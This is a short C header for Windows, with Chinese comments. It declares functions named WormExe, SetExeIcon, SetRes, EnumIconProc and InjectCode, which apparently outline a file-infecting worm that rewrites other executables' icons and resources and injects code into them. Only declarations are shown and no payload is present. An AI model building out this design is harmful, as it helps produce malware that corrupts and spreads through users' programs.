#ifndef GLOBAL_H
#define GLOBAL_H
#include <windows.h>

//修改指定可执行文件exe图标
void WormExe(char *szObjExePath);


//替换图标
BOOL SetExeIcon(char* szCurrentExePath, char* szObjExePath);

//枚举资源名回调函数
BOOL CALLBACK EnumIconProc(HMODULE hModule, LPCTSTR lpszType, LPTSTR lpszName, LONG lParam);

//设置资源
BOOL SetRes(LPSTR szImageName,LPSTR szResType, LPSTR szResName, LPVOID pData, DWORD cbData);

//注入
BOOL InjectCode(char* szObjExePath);

#endif
